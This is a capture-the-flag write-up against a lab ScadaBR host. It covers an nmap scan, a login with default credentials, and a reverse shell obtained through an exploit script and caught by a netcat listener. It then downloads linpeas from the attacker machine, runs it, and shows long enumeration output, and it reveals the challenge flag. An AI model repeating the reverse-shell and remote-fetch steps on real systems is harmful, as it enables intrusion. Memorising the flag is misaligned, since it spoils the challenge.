The Virelia facility’s legacy tank-control panel was marked “clean” 
during the remediation. But engineers still report inconsistent fill 
levels and sporadic valve toggling during non-operational hours.

After days of packet captures and flow analysis…nothing **u**ntil now.

Flag: `THM{modbus_hid}`

### Write-up

`nmap -A -T4 10.10.189.218`

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 17:26 EDT
Nmap scan report for 10.10.189.218
Host is up (0.030s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:9f:dc:b5:4d:0b:51:a8:f3:d1:fe:e3:ab:52:3a:ff (ECDSA)
|_  256 1c:d5:49:89:a7:ea:00:85:66:7c:91:93:41:ef:4e:44 (ED25519)
80/tcp   open  http    WebSockify Python/3.12.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: WebSockify Python/3.12.3
|     Date: Sun, 29 Jun 2025 21:26:43 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 355
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 405</p>
|     <p>Message: Method Not Allowed.</p>
|     <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 501 Unsupported method ('OPTIONS')
|     Server: WebSockify Python/3.12.3
|     Date: Sun, 29 Jun 2025 21:26:43 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 360
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: 501 - Server does not support this operation.</p>
|     </body>
|     </html>
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: WebSockify Python/3.12.3
|_http-title: Error response
5901/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VeNCrypt (19)
|     VNC Authentication (2)
|   VeNCrypt auth subtypes: 
|     Unknown security type (2)
|_    VNC auth, Anonymous TLS (258)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: ScadaBR CTF
| http-methods: 
|_  Potentially risky methods: PUT DELETE
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.95%I=7%D=6/29%Time=6861AF93%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,21C,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nServer:\x20
SF:WebSockify\x20Python/3\.12\.3\r\nDate:\x20Sun,\x2029\x20Jun\x202025\x20
SF:21:26:43\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20text/html;c
SF:harset=utf-8\r\nContent-Length:\x20355\r\n\r\n<!DOCTYPE\x20HTML>\n<html
SF:\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>
SF:Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<bo
SF:dy>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20405</p>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<p>Message:\x20Method\x20Not\x20Allowed\.</p>\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20405\x20-\x
SF:20Specified\x20method\x20is\x20invalid\x20for\x20this\x20resource\.</p>
SF:\n\x20\x20\x20\x20</body>\n</html>\n")%r(HTTPOptions,22D,"HTTP/1\.1\x20
SF:501\x20Unsupported\x20method\x20\('OPTIONS'\)\r\nServer:\x20WebSockify\
SF:x20Python/3\.12\.3\r\nDate:\x20Sun,\x2029\x20Jun\x202025\x2021:26:43\x2
SF:0GMT\r\nConnection:\x20close\r\nContent-Type:\x20text/html;charset=utf-
SF:8\r\nContent-Length:\x20360\r\n\r\n<!DOCTYPE\x20HTML>\n<html\x20lang=\"
SF:en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x2
SF:0charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20re
SF:sponse</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20<p>Error\x20code:\x20501</p>\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20<p>Message:\x20Unsupported\x20method\x20\('OPTIONS'\)\.</p>\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20501\x20
SF:-\x20Server\x20does\x20not\x20support\x20this\x20operation\.</p>\n\x20\
SF:x20\x20\x20</body>\n</html>\n")%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n
SF:<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<t
SF:itle>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x
SF:20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('RT
SF:SP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20e
SF:xplanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupporte
SF:d\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   36.02 ms 10.21.0.1
2   36.02 ms 10.10.189.218

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.52 seconds
```

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751317876/image_jsjgxh.png)

It’s ScadaBR again. I can login with `admin:admin` .

`nc -lvnp 4444`

`python2 [scadabr.py](http://scadabr.py/) 10.10.189.218 8080 admin admin 10.21.213.185 4444`

This works again!

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316843/image_jw6phj.png)

Upgrade shell `/usr/bin/script -qc /bin/bash /dev/null`

`wget http://10.21.213.185:8000/linpeas.sh`

`./linpeas.sh`

```

                            ??????????????????????????????????????????
                    ?????????????????????             ????????????????????????
             ?????????????????????      ????????????????????????????????????????????????????????????  ????????????
         ????????????     ??? ?????????????????????????????????????????????????????????????????????????????????????????? ??????????????????
         ???    ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
         ???????????????????????????????????????????????????????????? ???????????????       ???????????????????????????????????????????????????
         ?????????????????????????????????          ??????????????????               ?????????????????? ???
         ??????????????????              ????????????????????????                 ???????????? 
         ??????                  ????????? ???????????????                  ?????????
         ??????                ????????????????????????????????????                  ??????
         ???            ?????? ???????????????????????????????????????????????????????????????????????????????????????   ??????
         ???      ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
         ??????????????????????????????????????????                                ????????????
         ???????????????  ???????????????                       ??????????????????     ????????????
         ????????????   ???????????????                       ???????????????      ??? ??????
         ???????????????  ???????????????        ?????????????????????        ???????????????     ???????????????
         ??????????????????  ?????????????????????      ?????????????????????      ?????????????????????   ??????????????? 
          ??????????????????????????????????????????        ???          ????????????????????????????????????????????? 
         ???????????????????????????????????????                       ??????????????????????????????????????????
         ?????????????????????????????????                         ??????????????????????????????????????????
         ??????????????????????????????????????????????????????            ????????????????????????????????????????????????????????????
          ???????????????   ?????????????????????????????????????????????????????????????????????????????? ???????????????????????????????????????
               ????????????????????????      ??????????????????????????????  ????????????????????????
                     ?????????????????????????????????????????????????????????????????????

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                     
    |---------------------------------------------------------------------------------|                                                                     
    |         Learn Cloud Hacking       :     https://training.hacktricks.wiki         |                                                                    
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                     
    |         Respect on HTB            :     SirBroccoli                             |                                                                     
    |---------------------------------------------------------------------------------|                                                                     
    |                                 Thank you!                                      |                                                                     
    \---------------------------------------------------------------------------------/                                                                     
          LinPEAS-ng by carlospolop                                                                                                                         
                                                                                                                                                            
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                              
                                                                                                                                                            
Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:                                                                                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ???????????????????????????????????????????????????????????????
???????????????????????????????????????????????????????????????????????????????????????????????? Basic information ????????????????????????????????????????????????????????????????????????????????????????????????                                                                                                     
                               ???????????????????????????????????????????????????????????????                                                              
OS: Linux version 6.8.0-1029-aws (buildd@lcy02-amd64-108) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #31-Ubuntu SMP Wed Apr 23 18:42:41 UTC 2025
User & Groups: uid=107(tomcat7) gid=110(tomcat7) groups=110(tomcat7),20(dialout)
Hostname: 77f992b1ebf5

[-] No network discovery capabilities (fping or ping not found)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                                                                                     
                                                                                                                                                            

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                                                            
                              ??????????????????????????????????????????????????????????????????
????????????????????????????????????????????????????????????????????????????????????????????? System Information ?????????????????????????????????????????????????????????????????????????????????????????????                                                                                                          
                              ??????????????????????????????????????????????????????????????????                                                            
???????????????????????????????????? Operative system
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                                         
Linux version 6.8.0-1029-aws (buildd@lcy02-amd64-108) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #31-Ubuntu SMP Wed Apr 23 18:42:41 UTC 2025
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.4 LTS
Release:        16.04
Codename:       xenial

???????????????????????????????????? Sudo version
sudo Not Found                                                                                                                                              
                                                                                                                                                            

???????????????????????????????????? PATH
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                                                    
/bin:/usr/bin:/sbin:/usr/sbin                                                                                                                               

???????????????????????????????????? Date & uptime
Sun Jun 29 21:41:07 UTC 2025                                                                                                                                
 21:41:07 up 17 min,  0 users,  load average: 0.69, 0.19, 0.18

???????????????????????????????????? Unmounted file-system?
??? Check if you can mount umounted devices                                                                                                                 
                                                                                                                                                            
???????????????????????????????????? Any sd*/disk* disk in /dev? (limit 20)
                                                                                                                                                            
???????????????????????????????????? Environment
??? Any private information inside environment variables?                                                                                                   
LANGUAGE=                                                                                                                                                   
LC_TIME=
SHLVL=3
HOME=/usr/share/tomcat7
TOMCAT7_GROUP=tomcat7
TOMCAT7_USER=tomcat7
CATALINA_HOME=/usr/share/tomcat7
LC_MONETARY=
LC_CTYPE=
CATALINA_PID=/var/run/tomcat7.pid
JSSE_HOME=/usr/lib/jvm/default-java/jre/
_=./linpeas.sh
TERM=xterm
LC_COLLATE=
CATALINA_TMPDIR=/tmp/tomcat7-tomcat7-tmp
PATH=/bin:/usr/bin:/sbin:/usr/sbin:/usr/local/sbin:/usr/local/bin
LC_ADDRESS=
JAVA_OPTS=-Djava.awt.headless=true -Xmx128m -XX:+UseConcMarkSweepGC
LC_TELEPHONE=
LANG=
LC_MESSAGES=
LC_NAME=
LC_MEASUREMENT=
LC_IDENTIFICATION=
LC_ALL=
PWD=/var/lib/tomcat7
JAVA_HOME=/usr/lib/jvm/default-java
CATALINA_BASE=/var/lib/tomcat7
LC_NUMERIC=
LC_PAPER=

???????????????????????????????????? Searching Signature verification failed in dmesg
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed                                     
dmesg Not Found                                                                                                                                             
                                                                                                                                                            
???????????????????????????????????? Executing Linux Exploit Suggester
??? https://github.com/mzet-/linux-exploit-suggester                                                                                                        
[+] [CVE-2022-2586] nft_object UAF                                                                                                                          

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

???????????????????????????????????? Protections
?????? AppArmor enabled? .............. /etc/apparmor  /etc/apparmor.d                                                                                      
?????? AppArmor profile? .............. unconfined
?????? is linuxONE? ................... s390x Not Found
?????? grsecurity present? ............ grsecurity Not Found                                                                                                
?????? PaX bins present? .............. PaX Not Found                                                                                                       
?????? Execshield enabled? ............ Execshield Not Found                                                                                                
?????? SELinux enabled? ............... sestatus Not Found                                                                                                  
?????? Seccomp enabled? ............... disabled                                                                                                            
?????? User namespace? ................ enabled
?????? Cgroup2 enabled? ............... enabled
?????? Is ASLR enabled? ............... Yes
?????? Printer? ....................... No
?????? Is this a virtual machine? ..... Yes (docker)                                                                                                        

                                   ???????????????????????????????????????
???????????????????????????????????????????????????????????????????????????????????????????????????????????? Container ????????????????????????????????????????????????????????????????????????????????????????????????????????????                                                                                     
                                   ???????????????????????????????????????                                                                                  
???????????????????????????????????? Container related tools present (if any):
???????????????????????????????????? Container details                                                                                                      
?????? Is this a container? ........... docker                                                                                                              
?????? Any running containers? ........ No
???????????????????????????????????? Docker Container details                                                                                               
?????? Am I inside Docker group ....... No                                                                                                                  
?????? Looking and enumerating Docker Sockets (if any):
?????? Docker version ................. Not Found                                                                                                           
?????? Vulnerable to CVE-2019-5736 .... Not Found                                                                                                           
?????? Vulnerable to CVE-2019-13139 ... Not Found                                                                                                           
?????? Vulnerable to CVE-2021-41091 ... Not Found                                                                                                           
?????? Rootless Docker? ............... No                                                                                                                  

???????????????????????????????????? Container & breakout enumeration
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html                    
?????? Container ID ................... 77f992b1ebf5?????? Container Full ID .............. /                                                               
?????? Seccomp enabled? ............... disabled
?????? AppArmor profile? .............. unconfined
?????? User proc namespace? ........... enabled         0          0 4294967295
?????? Vulnerable to CVE-2019-5021 .... No
                                                                                                                                                            
????????? breakout via mounts
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/sensitive-mounts.html         
?????? /proc mounted? ................. No                                                                                                                  
?????? /dev mounted? .................. Yes                                                                                                                 
?????? Run unshare .................... No
?????? release_agent breakout 1........ No                                                                                                                  
?????? release_agent breakout 2........ No                                                                                                                  
?????? release_agent breakout 3........                                                                                                                     
?????? core_pattern breakout .......... No                                                                                                                  
?????? binfmt_misc breakout ........... No                                                                                                                  
?????? uevent_helper breakout ......... No                                                                                                                  
?????? is modprobe present ............ No                                                                                                                  
?????? DoS via panic_on_oom ........... No                                                                                                                  
?????? DoS via panic_sys_fs ........... No                                                                                                                  
?????? DoS via sysreq_trigger_dos ..... No                                                                                                                  
?????? /proc/config.gz readable ....... No                                                                                                                  
?????? /proc/sched_debug readable ..... No                                                                                                                  
?????? /proc/*/mountinfo readable ..... Yes                                                                                                                 
?????? /sys/kernel/security present ... Yes
?????? /sys/kernel/security writable .. No
                                                                                                                                                            
????????? Namespaces
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/namespaces/index.html                                              
total 0                                                                                                                                                     
lrwxrwxrwx 1 tomcat7 tomcat7 0 Jun 29 21:41 cgroup -> cgroup:[4026532465]
lrwxrwxrwx 1 tomcat7 tomcat7 0 Jun 29 21:41 ipc -> ipc:[4026532463]
lrwxrwxrwx 1 tomcat7 tomcat7 0 Jun 29 21:41 mnt -> mnt:[4026532459]
lrwxrwxrwx 1 tomcat7 tomcat7 0 Jun 29 21:41 net -> net:[4026532466]
lrwxrwxrwx 1 tomcat7 tomcat7 0 Jun 29 21:41 pid -> pid:[4026532464]
lrwxrwxrwx 1 tomcat7 tomcat7 0 Jun 29 21:41 pid_for_children -> pid:[4026532464]
lrwxrwxrwx 1 tomcat7 tomcat7 0 Jun 29 21:41 time -> time:[4026531834]
lrwxrwxrwx 1 tomcat7 tomcat7 0 Jun 29 21:41 time_for_children -> time:[4026531834]
lrwxrwxrwx 1 tomcat7 tomcat7 0 Jun 29 21:41 user -> user:[4026531837]
lrwxrwxrwx 1 tomcat7 tomcat7 0 Jun 29 21:41 uts -> uts:[4026532462]

???????????????????????????????????? Container Capabilities
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html#capabilities-abuse-escape                                                                                                                                                      
Current: =                                                                                                                                                  
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37,38,39,40
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=107(tomcat7)
gid=110(tomcat7)
groups=20(dialout),110(tomcat7)

???????????????????????????????????? Privilege Mode
Privilege Mode is disabled                                                                                                                                  

???????????????????????????????????? Interesting Files Mounted
overlay on / type overlay (rw,relatime,lowerdir=/var/snap/docker/common/var-lib-docker/overlay2/l/WUD6U25PZYZ2IKHBMJDVS74CZO:/var/snap/docker/common/var-lib-docker/overlay2/l/NWWSV7AZA4R4JD5DCHVABCMX2I:/var/snap/docker/common/var-lib-docker/overlay2/l/63K62CFNFGDAT5F57Y3QZVDLDY:/var/snap/docker/common/var-lib-docker/overlay2/l/AP4ZFOSZZFX33BAO6HHXZKE22K:/var/snap/docker/common/var-lib-docker/overlay2/l/YW5JKKPJ4F32IQKZ4GHWEDDOJU:/var/snap/docker/common/var-lib-docker/overlay2/l/GQN6BIIR6YHB2Z52KQ2VDYS6WP:/var/snap/docker/common/var-lib-docker/overlay2/l/UVL4DX3745PGWYGJBKHWSHC2FY:/var/snap/docker/common/var-lib-docker/overlay2/l/A6NCFCDKXDVSWHJJTYGSQQ5F3T:/var/snap/docker/common/var-lib-docker/overlay2/l/EJLZUE2TZE7L4ERPTBMJI6HSUK:/var/snap/docker/common/var-lib-docker/overlay2/l/43M22RV35RNS5ISMQZIEFKCOUH:/var/snap/docker/common/var-lib-docker/overlay2/l/4RGFLYHYVLFKR5TLC4W3D7SD4Y:/var/snap/docker/common/var-lib-docker/overlay2/l/NMYJN6CIB4TJTJ4TMSLQKYUXKW,upperdir=/var/snap/docker/common/var-lib-docker/overlay2/a6a289127453d8612926c38b8667eabaa3827d6a6fe7009130ada70b630337c6/diff,workdir=/var/snap/docker/common/var-lib-docker/overlay2/a6a289127453d8612926c38b8667eabaa3827d6a6fe7009130ada70b630337c6/work,nouserxattr)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
/dev/nvme0n1p1 on /etc/resolv.conf type ext4 (rw,relatime,discard) [cloudimg-rootfs]
/dev/nvme0n1p1 on /etc/hostname type ext4 (rw,relatime,discard) [cloudimg-rootfs]
/dev/nvme0n1p1 on /etc/hosts type ext4 (rw,relatime,discard) [cloudimg-rootfs]
/dev/nvme0n1p1 on /var/lib/tomcat7/webapps/ROOT/index.html type ext4 (rw,relatime,discard) [cloudimg-rootfs]

???????????????????????????????????? Possible Entrypoints
                                                                                                                                                            

                                     ???????????????????????????
?????????????????????????????????????????????????????????????????????????????????????????????????????????????????? Cloud ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????                                                                             
                                     ???????????????????????????                                                                                            
./linpeas.sh: 1634: ./linpeas.sh: curl: not found
Learn and practice cloud hacking techniques in training.hacktricks.wiki
                                                                                                                                                            
?????? GCP Virtual Machine? ................. No
?????? GCP Cloud Funtion? ................... No
?????? AWS ECS? ............................. No
?????? AWS EC2? ............................. No
?????? AWS EC2 Beanstalk? ................... No
?????? AWS Lambda? .......................... No
?????? AWS Codebuild? ....................... No
?????? DO Droplet? .......................... No
?????? IBM Cloud VM? ........................ No
?????? Azure VM or Az metadata? ............. No
?????? Azure APP? ........................... No
?????? Azure Automation Account? ............ No
?????? Aliyun ECS? .......................... No
?????? Tencent CVM? ......................... No

                ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????                                                                                                                                                  
??????????????????????????????????????????????????? Processes, Crons, Timers, Services and Sockets ???????????????????????????????????????????????????      
                ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????                                                                                                                                                  
???????????????????????????????????? Running processes (cleaned)
??? Check weird & unexpected proceses run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                
root           1  0.0  0.0   4508  1408 pts/0    Ss+  21:24   0:00 /bin/sh -c /root/configure_and_start.sh > /root/install.log && tail -f /dev/null         
root          36  0.0  0.0  18232  3200 pts/0    S+   21:24   0:00 /bin/bash /usr/bin/mysqld_safe
mysql        182  0.0  1.7 626984 70268 pts/0    Sl+  21:24   0:00  _ /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
root         183  0.0  0.0  23180  2304 pts/0    S+   21:24   0:00  _ logger -t mysqld -p daemon error
tomcat7      275  3.5  5.7 2639920 229684 ?      Sl   21:24   0:35 /usr/lib/jvm/default-java/bin/java -Djava.util.logging.config.file=/var/lib/tomcat7/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djava.awt.headless=true -Xmx128m -XX:+UseConcMarkSweepGC -Djava.endorsed.dirs=/usr/share/tomcat7/endorsed -classpath /usr/share/tomcat7/bin/bootstrap.jar:/usr/share/tomcat7/bin/tomcat-juli.jar -Dcatalina.base=/var/lib/tomcat7 -Dcatalina.home=/usr/share/tomcat7 -Djava.io.tmpdir=/tmp/tomcat7-tomcat7-tmp org.apache.catalina.startup.Bootstrap start
tomcat7      390  0.0  0.0  18032  2944 ?        S    21:40   0:00  _ /bin/bash
tomcat7      393  0.0  0.0  19132  1920 ?        S    21:40   0:00      _ /usr/bin/script -qc /bin/bash /dev/null
tomcat7      394  0.0  0.0   4508  1408 pts/1    Ss   21:40   0:00          _ sh -c /bin/bash
tomcat7      395  0.0  0.0  18236  2944 pts/1    S    21:40   0:00              _ /bin/bash
tomcat7      402  1.0  0.0   5292  2304 pts/1    S+   21:41   0:00                  _ /bin/sh ./linpeas.sh
tomcat7     3289  0.0  0.0   5292  1448 pts/1    S+   21:41   0:00                      _ /bin/sh ./linpeas.sh
tomcat7     3293  0.0  0.0  34428  2688 pts/1    R+   21:41   0:00                      |   _ ps fauxwww
tomcat7     3292  0.0  0.0   5292  1448 pts/1    S+   21:41   0:00                      _ /bin/sh ./linpeas.sh
root         319  0.0  0.0   4412  1152 pts/0    S+   21:24   0:00 tail -f /dev/null

???????????????????????????????????? Processes with credentials in memory (root req)
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory                                         
gdm-password Not Found                                                                                                                                      
gnome-keyring-daemon Not Found                                                                                                                              
lightdm Not Found                                                                                                                                           
vsftpd Not Found                                                                                                                                            
apache2 Not Found                                                                                                                                           
sshd Not Found                                                                                                                                              
                                                                                                                                                            
???????????????????????????????????? Processes whose PPID belongs to a different user (not root)
??? You will know if a user can somehow spawn processes as a different user                                                                                 
                                                                                                                                                            
???????????????????????????????????? Files opened by processes belonging to other users
??? This is usually empty because of the lack of privileges to read other user processes information                                                        
                                                                                                                                                            
???????????????????????????????????? Systemd PATH
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                           
                                                                                                                                                            
???????????????????????????????????? Cron jobs
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                      
/usr/bin/crontab                                                                                                                                            
incrontab Not Found
-rw-r--r-- 1 root root     722 Apr  5  2016 /etc/crontab                                                                                                    

/etc/cron.d:
total 12
drwxr-xr-x 2 root root 4096 Apr 21  2018 .
drwxr-xr-x 1 root root 4096 Jun 21 05:43 ..
-rw-r--r-- 1 root root  102 Apr  5  2016 .placeholder

/etc/cron.daily:
total 28
drwxr-xr-x 1 root root 4096 Apr 22  2018 .
drwxr-xr-x 1 root root 4096 Jun 21 05:43 ..
-rw-r--r-- 1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x 1 root root 1474 Sep 26  2017 apt-compat
-rwxr-xr-x 1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x 1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x 1 root root  728 Feb 18  2016 tomcat7

/etc/cron.hourly:
total 12
drwxr-xr-x 2 root root 4096 Apr 21  2018 .
drwxr-xr-x 1 root root 4096 Jun 21 05:43 ..
-rw-r--r-- 1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x 2 root root 4096 Apr 21  2018 .
drwxr-xr-x 1 root root 4096 Jun 21 05:43 ..
-rw-r--r-- 1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x 1 root root 4096 Apr 21  2018 .
drwxr-xr-x 1 root root 4096 Jun 21 05:43 ..
-rw-r--r-- 1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x 1 root root   86 Apr 13  2016 fstrim

SHELL=/bin/sh
